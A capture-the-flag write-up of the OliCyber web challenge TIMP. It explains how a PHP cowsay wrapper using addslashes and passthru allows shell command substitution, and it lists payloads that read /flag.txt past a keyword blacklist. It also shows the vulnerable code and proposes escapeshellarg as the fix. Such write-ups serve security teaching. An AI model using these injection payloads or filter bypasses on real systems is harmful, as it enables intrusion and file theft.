# TIMP (The Unhackable Talking Cow Terminal)

**Competition:** OliCyber <br>
**Category:** Web <br>
**URL:** http://timp.challs.olicyber.it

---

## Description

> Welcome to TIMP (The Unhackable Talking Cow Terminal).
Its only purpose is to make a cow say things :) Can you read the flag?
...Of course not. But you can try! The flag is located at /flag.txt

The web terminal allows making a cow speak using `cowsay`. The goal is to read `/flag.txt` while bypassing a blacklist of commands and characters.

---

## Solution

### 1. Source analysis — `handler.php`

The backend applies the following filters:

- **Blocked characters:** `#@%^&*_+[]:>?~\\`
- **Maximum length:** 70 characters
- **Blocked keywords:** `cat`, `head`, `tail`, `od`, `less`, `hexdump`, `echo`, `sudo`
- **Spaces:** blocked outside the `cowsay` path
- **Output truncated to 10 chars** when executed via `exec()`

### 2. Vulnerability — Command injection via `cowsay`

The `cowsay` path is the only one that uses `passthru()` (full output, not truncated) and builds the command like this:

```php
$result = passthru('cowsay "'.addslashes($str).'"');
```

`addslashes` only escapes `"`, `'` and `\`, but **does not prevent shell command substitution** `$()`. It is therefore possible to inject arbitrary commands inside the double quotes.

### 3. Exploit

To read `/flag.txt` without using `cat` or other blocked binaries, use `tr` in passthrough mode:

```
cowsay "$(tr a a </flag.txt)"
```

`tr a a` translates `a` to `a`, effectively copying stdin to stdout (like `cat`) while not being blacklisted. The server constructs:

```bash
cowsay "$(tr a a </flag.txt)"
```

The shell executes the substitution first; the content of `/flag.txt` becomes the argument to `cowsay` and is printed inside the cow.

Other valid alternatives include:

```
cowsay "$(tac /flag.txt)"
cowsay "$(rev /flag.txt)"
cowsay "$(grep . /flag.txt)"
```

---

## Flag

```
flag{...}
```

---

## Conclusions

The blacklist is bypassable because:

1. `passthru()` does not sanitize input against command substitution
2. `addslashes` is insufficient against shell injection
3. There are many `cat` alternatives not included in the blacklist (`tr`, `tac`, `rev`, `grep`)

**Proper fix:** never build shell commands by concatenating user input. Use `escapeshellarg()` on the entire argument or reimplement `cowsay` in PHP.
